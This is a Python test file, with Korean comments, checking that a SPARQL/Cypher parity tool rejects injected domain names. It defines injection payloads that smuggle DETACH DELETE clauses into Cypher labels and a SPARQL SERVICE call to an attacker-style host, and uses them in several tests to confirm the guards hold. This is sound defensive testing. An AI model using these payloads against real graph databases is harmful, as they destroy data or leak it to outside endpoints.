"""verify_sparql_cypher_parity 의 CQ domain 주입 회귀 테스트 (실제 Neo4j 없음).

CQ domains 는 사용자 입력이나 LLM 출력이다. parity 검사는 이 값을 SPARQL prefixed
name 과 Cypher label 자리에 넣으므로, 식별자가 아닌 값은 어느 실행 sink 에도 닿으면
안 되고 Cypher 는 neo4j_query 와 같은 clause guard 와 READ 세션으로만 실행돼야 한다.
"""

from __future__ import annotations

import json
from unittest.mock import MagicMock

import pytest
from rdflib import RDF

from domain.namespaces import DOMAIN_INST_NS_OBJ as INST
from domain.namespaces import DOMAIN_NS_OBJ as DOMAIN_NS
from domain.tbox_utils import _new_graph

CYPHER_PAYLOAD = "LPGNode) DETACH DELETE n RETURN 0 AS cnt //"
CYPHER_PAYLOAD_WITH = "X) WITH 1 AS d MATCH (m) DETACH DELETE m RETURN count(*) AS cnt //"
SPARQL_EGRESS_PAYLOAD = "X } SERVICE <http://attacker.invalid/> { ?s ?p ?o"


class _RecordingGraph:
    """로컬 SPARQL 그래프 대역. 실행된 쿼리를 기록하고 실제 rdflib 그래프에 위임한다."""

    def __init__(self, graph):
        self._graph = graph
        self.queries: list[str] = []

    def query(self, query: str):
        self.queries.append(query)
        return self._graph.query(query)


def _sample_graph():
    """EquipmentMaster 3개, MaintenanceHistory 2개, 둘 사이 관계 3개."""
    g = _new_graph()
    for i in range(1, 4):
        g.add((INST[f"EquipmentMaster_EQ{i:03d}"], RDF.type, DOMAIN_NS.EquipmentMaster))
    for i in range(1, 3):
        g.add((INST[f"MaintenanceHistory_MH{i:03d}"], RDF.type, DOMAIN_NS.MaintenanceHistory))
    g.add((INST["EquipmentMaster_EQ001"], DOMAIN_NS.hasMaintenanceHistory, INST["MaintenanceHistory_MH001"]))
    g.add((INST["EquipmentMaster_EQ001"], DOMAIN_NS.hasMaintenanceHistory, INST["MaintenanceHistory_MH002"]))
    g.add((INST["EquipmentMaster_EQ002"], DOMAIN_NS.hasMaintenanceHistory, INST["MaintenanceHistory_MH001"]))
    return g


def _cypher_count_for(query: str) -> int:
    """Neo4j 대역의 응답. 그래프 픽스처와 같은 수를 돌려준다."""
    if "EquipmentMaster" in query and "MaintenanceHistory" in query:
        return 3
    if "EquipmentMaster" in query:
        return 3
    if "MaintenanceHistory" in query:
        return 2
    return 0


@pytest.fixture
def parity_env(monkeypatch, tmp_path):
    """CQ 파일, SPARQL 그래프, Neo4j driver 를 모두 메모리 대역으로 바꾼다."""
    monkeypatch.setattr("tools.remote.neo4j.NEO4J_URI", "bolt://localhost:7687")

    graph = _RecordingGraph(_sample_graph())
    monkeypatch.setattr("tools.sparql_local._get_graph", lambda source="inferred": (graph, "test graph"))

    session = MagicMock()
    session.__enter__ = MagicMock(return_value=session)
    session.__exit__ = MagicMock(return_value=False)

    def _run(query, *args, **kwargs):
        record = MagicMock()
        record.data.return_value = {"cnt": _cypher_count_for(query)}
        return [record]

    session.run.side_effect = _run
    driver = MagicMock()
    driver.session.return_value = session
    monkeypatch.setattr("tools.remote.neo4j._get_driver", lambda: driver)

    def _write_cqs(cqs):
        path = tmp_path / "competency_questions.json"
        path.write_text(json.dumps(cqs, ensure_ascii=False), encoding="utf-8")
        monkeypatch.setattr("config.COMPETENCY_QUESTIONS_PATH", str(path))

    return {"graph": graph, "driver": driver, "session": session, "write_cqs": _write_cqs}


def _executed_cypher(session) -> list[str]:
    return [c.args[0] for c in session.run.call_args_list]


@pytest.mark.parametrize("payload", [CYPHER_PAYLOAD, CYPHER_PAYLOAD_WITH, SPARQL_EGRESS_PAYLOAD])
def test_injected_domain_never_reaches_execution_sinks(parity_env, payload):
    from tools.remote.neo4j import verify_sparql_cypher_parity

    parity_env["write_cqs"]([
        {"id": "CQ-ATTACK", "domains": [payload, "Equipment_Master"]},
    ])

    result = json.loads(verify_sparql_cypher_parity())

    executed = _executed_cypher(parity_env["session"])
    assert executed, "정상 domain 의 Cypher 는 실행돼야 한다"
    for query in executed:
        assert "DELETE" not in query.upper()
        assert payload not in query
    for query in parity_env["graph"].queries:
        assert payload not in query
        assert "SERVICE" not in query.upper()

    # 쓰기 가능한 기본 세션은 열리지 않는다.
    for call in parity_env["driver"].session.call_args_list:
        assert call.kwargs.get("default_access_mode") == "READ"

    cq = result["results"][0]
    assert cq["rejected_domains"] == [payload]
    assert cq["all_match"] is None
    assert result["rejected_domain_count"] == 1
    assert result["warnings"]
    assert [c["class"] for c in cq["checks"]] == ["EquipmentMaster"]


def test_legitimate_domains_keep_counts_and_use_read_session(parity_env):
    from tools.remote.neo4j import verify_sparql_cypher_parity

    parity_env["write_cqs"]([
        {"id": "CQ1", "domains": ["Equipment_Master", "Maintenance_History"]},
    ])

    result = json.loads(verify_sparql_cypher_parity())

    assert result["success"] is True
    assert result["parity_score"] == 100.0
    assert result["total_checks"] == 3
    assert "rejected_domain_count" not in result
    assert "warnings" not in result
    cq = result["results"][0]
    assert cq["all_match"] is True
    assert "rejected_domains" not in cq
    by_check = {(c["check"], c.get("class") or c.get("pair")): c for c in cq["checks"]}
    assert by_check[("instance_count", "EquipmentMaster")]["sparql"] == 3
    assert by_check[("instance_count", "MaintenanceHistory")]["cypher"] == 2
    assert by_check[("relationship_count", "EquipmentMaster↔MaintenanceHistory")]["sparql"] == 3

    executed = _executed_cypher(parity_env["session"])
    assert "MATCH (n:`EquipmentMaster`) WHERE n.uri IS NOT NULL RETURN count(n) AS cnt" in executed
    assert "MATCH (a:`EquipmentMaster`)-[r]-(b:`MaintenanceHistory`) RETURN count(r) AS cnt" in executed
    assert parity_env["driver"].session.call_count == 3
    for call in parity_env["driver"].session.call_args_list:
        assert call.kwargs == {"default_access_mode": "READ"}


def test_class_names_that_look_like_keywords_are_not_blocked(parity_env):
    """backtick 으로 감싼 label 은 guard 대상이 아니고, prefixed name 은 egress guard 대상이 아니다."""
    from tools.remote.neo4j import verify_sparql_cypher_parity

    parity_env["write_cqs"]([
        {"id": "CQ-KW", "domains": ["Stop", "Remove", "Service", "From"]},
    ])

    result = json.loads(verify_sparql_cypher_parity())

    checks = result["results"][0]["checks"]
    assert len(checks) == 4 + 6
    for check in checks:
        assert check["sparql"] >= 0
        assert check["cypher"] >= 0
    executed = _executed_cypher(parity_env["session"])
    assert "MATCH (n:`Stop`) WHERE n.uri IS NOT NULL RETURN count(n) AS cnt" in executed
    # LPG 변환과 같은 sanitize 규칙이라 예약어는 `_` 접미사가 붙은 label 로 조회한다.
    assert "MATCH (n:`Remove_`) WHERE n.uri IS NOT NULL RETURN count(n) AS cnt" in executed


def test_non_string_domains_are_rejected_without_crash(parity_env):
    from tools.remote.neo4j import verify_sparql_cypher_parity

    parity_env["write_cqs"]([
        {"id": "CQ-BAD", "domains": [None, 123, "", "Equipment_Master"]},
    ])

    result = json.loads(verify_sparql_cypher_parity())

    cq = result["results"][0]
    assert cq["rejected_domains"] == ["None", "123", ""]
    assert [c["class"] for c in cq["checks"]] == ["EquipmentMaster"]


def test_read_single_rejects_blocked_clause_before_opening_session(monkeypatch):
    """옛 보간 결과 query 는 guard 가 DELETE 로 거부하고 driver 를 열지 않는다."""
    from tools.remote.neo4j import _cypher_blocked_clause, _run_cypher_read_single

    old_query = f"MATCH (n:{CYPHER_PAYLOAD}) WHERE n.uri IS NOT NULL RETURN count(n) AS cnt"
    assert _cypher_blocked_clause(old_query) == "DELETE"

    driver = MagicMock()
    monkeypatch.setattr("tools.remote.neo4j._get_driver", lambda: driver)
    with pytest.raises(ValueError, match="DELETE"):
        _run_cypher_read_single(old_query)
    driver.session.assert_not_called()


def test_parity_label_cannot_escape_backticks():
    from tools.remote.neo4j import _parity_cypher_label

    label = _parity_cypher_label("Foo`) DETACH DELETE n //")
    assert label.count("`") == 2
    assert label.startswith("`") and label.endswith("`")


def test_parity_sparql_count_rejects_egress_before_query():
    from tools.remote.neo4j import _parity_sparql_count

    graph = MagicMock()
    with pytest.raises(ValueError):
        _parity_sparql_count(graph, "SELECT * WHERE { SERVICE <http://attacker.invalid/> { ?s ?p ?o } }")
    graph.query.assert_not_called()
